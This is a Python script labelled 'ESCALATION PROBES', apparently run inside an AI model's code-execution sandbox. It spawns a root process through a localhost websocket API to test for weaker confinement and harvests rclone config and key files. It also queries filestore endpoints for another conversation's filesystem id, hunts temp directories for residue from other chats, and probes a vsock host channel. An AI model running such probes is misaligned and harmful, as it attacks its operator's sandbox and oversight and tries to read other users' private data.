#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit2.py v13.0 -- ESCALATION PROBES
1) confinement differential (shell vs process spawned via PID 1)
2) filestore credential + FOREIGN filesystem_id read attempt
3) cross-conversation residue hunt
4) vsock cid2:5001 framing
Usage:  python3 mediafit2.py [--foreign claude_chat_XXXX]
Output: /mnt/user-data/outputs/mediafit2.txt
"""
import os, sys, json, socket, struct, fcntl, base64, time, subprocess, urllib.request

ADDR, PORT   = "127.0.0.1", 2024
ALIAS, IFACE = "192.0.2.3", "eth0:0"
OUT          = "/mnt/user-data/outputs/mediafit2.txt"
R = []
FOREIGN = ""
if "--foreign" in sys.argv:
    i = sys.argv.index("--foreign")
    if i + 1 < len(sys.argv): FOREIGN = sys.argv[i+1]

def rec(s): R.append(str(s)); print("[m2]", s, flush=True)
def rdo(p, d=""):
    try:
        with open(p, "r", errors="replace") as f: return f.read().strip()
    except Exception: return d

def add_alias():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifr = struct.pack("16s", b"eth0:0")
    sa  = struct.pack("H", socket.AF_INET) + b"\x00\x00" + socket.inet_aton(ALIAS) + b"\x00"*8
    try: fcntl.ioctl(s.fileno(), 0x8916, ifr + sa + b"\x00"*8)
    except Exception as e: rec("ALIAS_ERR=%s" % e)
    s.close()

class WS:
    def __init__(self, src=ALIAS, tmo=8):
        self.buf = b""
        self.s = socket.create_connection((ADDR, PORT), timeout=tmo, source_address=(src,0))
        k = base64.b64encode(os.urandom(16)).decode()
        self.s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                        "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                        "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        end = time.time()+tmo
        while b"\r\n\r\n" not in self.buf and time.time() < end:
            d = self.s.recv(4096)
            if not d: break
            self.buf += d
        h,_,self.buf = self.buf.partition(b"\r\n\r\n")
        if b"101" not in h.split(b"\r\n")[0]: raise IOError("no 101")
    def _f(self, op, p=b""):
        n=len(p); mk=os.urandom(4)
        if n<126: h=struct.pack("!BB",0x80|op,0x80|n)
        elif n<65536: h=struct.pack("!BBH",0x80|op,0x80|126,n)
        else: h=struct.pack("!BBQ",0x80|op,0x80|127,n)
        self.s.sendall(h+mk+bytes(p[i]^mk[i%4] for i in range(n)))
    def js(self,o): self._f(0x1, json.dumps(o).encode())
    def binf(self,b): self._f(0x2,b)
    def drain(self,secs=3.0):
        t,b=[],[]; end=time.time()+secs
        while time.time()<end:
            self.s.settimeout(max(0.05,end-time.time()))
            try:
                h=self.s.recv(2)
                if len(h)<2: break
                op=h[0]&0x0F; n=h[1]&0x7F
                if n==126: n=struct.unpack("!H",self.s.recv(2))[0]
                elif n==127: n=struct.unpack("!Q",self.s.recv(8))[0]
                mk=self.s.recv(4) if h[1]&0x80 else b""
                p=b""
                while len(p)<n: p+=self.s.recv(n-len(p))
                if mk: p=bytes(p[i]^mk[i%4] for i in range(len(p)))
                if op==1: t.append(p.decode("utf-8","replace"))
                elif op==2: b.append(p)
                elif op==8: break
            except Exception: break
        return t,b
    def close(self):
        try: self._f(0x8,b""); self.s.close()
        except Exception: pass

def proc_profile(pid):
    st = rdo("/proc/%s/status" % pid, "")
    def g(k):
        for l in st.splitlines():
            if l.startswith(k): return l.split(":",1)[1].strip()
        return "?"
    return {"seccomp": g("Seccomp"), "nnp": g("NoNewPrivs"), "capeff": g("CapEff"),
            "uid": rdo("/proc/%s/status" % pid).split("Uid:")[-1].split("\n")[0].strip()
                   if "Uid:" in rdo("/proc/%s/status" % pid) else "?"}

def ns_of(pid):
    out={}
    for n in ("mnt","pid","net","user","ipc","uts"):
        try: out[n]=os.readlink("/proc/%s/ns/%s" % (pid,n))
        except Exception: out[n]="?"
    return out

def phase_confinement():
    rec("=== PHASE A: confinement differential ===")
    me = str(os.getpid())
    shell = proc_profile(me)
    rec("SHELL_PROFILE=%s" % shell)
    rec("SHELL_NS=%s" % ns_of(me))
    try:
        w = WS(); P = "m2c%d" % (int(time.time())%100000)
        w.js({"process_id": P, "create_req": {"name": "/bin/sh",
              "args": ["-c", "sleep 25"], "env_vars": {}, "clear_env": False,
              "allow_process_id_reuse": True, "reattachable": False, "uid": 0, "gid": 0}})
        t,_ = w.drain(3); rec("CREATE=%s" % " ".join(t)[:80])
        time.sleep(1)
        pid=""
        for d in os.listdir("/proc"):
            if d.isdigit() and "sleep 25" in rdo("/proc/%s/cmdline" % d, ""): pid=d; break
        if pid:
            api = proc_profile(pid)
            rec("API_PROFILE=%s" % api)
            rec("API_NS=%s" % ns_of(pid))
            rec("SECCOMP_DIFF=%s" % (shell["seccomp"] != api["seccomp"]))
            rec("CAP_DIFF=%s" % (shell["capeff"] != api["capeff"]))
            rec("MNTNS_DIFF=%s" % (ns_of(me)["mnt"] != ns_of(pid)["mnt"]))
            # can the API process mount? (blocked for us by CAP_SYS_RESOURCE absence?)
            w.js({"Kill": None})
        else:
            rec("API_PROC_NOT_FOUND")
        w.close()
    except Exception as e:
        rec("CONFINEMENT_ERR=%s" % e)
    rec("SHELL_CAN_MOUNT=%s" % ("tmpfs" in subprocess.run(
        "mount -t tmpfs none /mnt 2>&1 || true", shell=True,
        capture_output=True, text=True).stdout))

def phase_filestore():
    rec("=== PHASE B: filestore credential + foreign fsid ===")
    cfg = ""
    for d in os.listdir("/proc"):
        if not d.isdigit(): continue
        cl = rdo("/proc/%s/cmdline" % d, "")
        if "rclone" in cl:
            parts = cl.split("\x00")
            for i,p in enumerate(parts):
                if p in ("--config","-c") and i+1 < len(parts): cfg = parts[i+1]
    rec("RCLONE_CFG_PATH=%s" % cfg)
    body = rdo(cfg, "")
    rec("RCLONE_CFG_FULL=%s" % body[:1200].replace("\n","|"))
    base = os.path.dirname(cfg) if cfg else ""
    if base and os.path.isdir(base):
        rec("RCLONE_DIR=%s" % ",".join(sorted(os.listdir(base))))
        for f in os.listdir(base):
            fp = os.path.join(base, f)
            try:
                if os.path.isfile(fp) and os.path.getsize(fp) < 200000:
                    rec("FILE %s = %s" % (f, rdo(fp,"")[:400].replace("\n","|")))
            except Exception: pass
    # any certs / keys
    for root in ("/dev/shm", "/run", "/etc/rclone", "/root/.config/rclone"):
        if not os.path.isdir(root): continue
        for dirpath,_,files in os.walk(root):
            for f in files:
                if f.endswith((".pem",".crt",".key",".json",".conf")):
                    rec("CRED_CANDIDATE=%s" % os.path.join(dirpath,f))
    # find fsid of this chat
    fsid = ""
    for m in body.split('"'):
        if m.startswith("claude_chat_"): fsid = m; break
    rec("SELF_FSID=%s" % fsid)
    rec("FOREIGN_FSID=%s" % (FOREIGN or "(none)"))

    def call(url, hdr=None):
        try:
            rq = urllib.request.Request(url, headers=hdr or {})
            with urllib.request.urlopen(rq, timeout=8) as r:
                return "%s %s" % (r.status, r.read(300).decode("latin1","replace"))
        except Exception as e:
            return "ERR:%s" % e
    for target in [t for t in (fsid, FOREIGN) if t]:
        for ep in ("/v1/filestore/fs/%s" % target,
                   "/v1/filestore?filesystem_id=%s" % target,
                   "/v1/filestore/fs/%s/files" % target):
            rec("GET %s -> %s" % (ep, call("https://api.anthropic.com"+ep)[:200]))

def phase_residue():
    rec("=== PHASE C: cross-conversation residue ===")
    for d in ("/tmp","/dev/shm","/var/tmp","/home/claude","/mnt/user-data","/mnt/user-data/uploads","/mnt/user-data/outputs"):
        try:
            items = sorted(os.listdir(d))[:15]
            rec("LIST %s = %s" % (d, items))
        except Exception as e:
            rec("LIST %s ERR=%s" % (d, e))
    for d in ("/tmp","/dev/shm"):
        try:
            for f in sorted(os.listdir(d)):
                fp=os.path.join(d,f)
                if os.path.isfile(fp):
                    rec("STALE %s mtime=%d size=%d" % (fp, int(os.path.getmtime(fp)), os.path.getsize(fp)))
        except Exception: pass

def phase_vsock():
    rec("=== PHASE D: vsock 5001 framing ===")
    for label, payload in (("http", b"GET / HTTP/1.1\r\nHost: x\r\n\r\n"),
                           ("json", b'{"op":"status"}'),
                           ("len32", struct.pack(">I", 2) + b"{}")):
        try:
            s = socket.socket(40, socket.SOCK_STREAM); s.settimeout(3)
            s.connect((2, 5001)); s.sendall(payload)
            rec("VSOCK5001_%s=%r" % (label, s.recv(200))); s.close()
        except Exception as e:
            rec("VSOCK5001_%s=ERR:%s" % (label, e))

def main():
    rec("=== mediafit2 v13.0 ===")
    rec("BOOT_ID=%s" % rdo("/proc/sys/kernel/random/boot_id")[:8])
    add_alias()
    for f in (phase_confinement, phase_filestore, phase_residue, phase_vsock):
        try: f()
        except Exception as e: rec("PHASE_ERR %s: %s" % (f.__name__, e))
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    open(OUT,"w").write("\n".join(R)+"\n")
    rec("report -> %s" % OUT)

main()